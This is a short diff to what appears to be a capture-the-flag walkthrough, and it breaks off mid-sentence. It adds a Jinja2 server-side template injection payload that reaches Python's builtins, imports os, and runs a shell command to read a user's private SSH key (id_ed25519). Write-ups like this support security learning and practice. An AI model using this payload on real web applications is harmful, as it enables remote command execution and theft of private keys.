@@ -254,5 +254,6 @@ So viewing this in the source code was easier the private key is called `id_ed25
 Now ill read the private key
 
 ```python
-
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /home/ghill_sa/.ssh/id_ed25519')['read']()}}
 ```
+This iis th
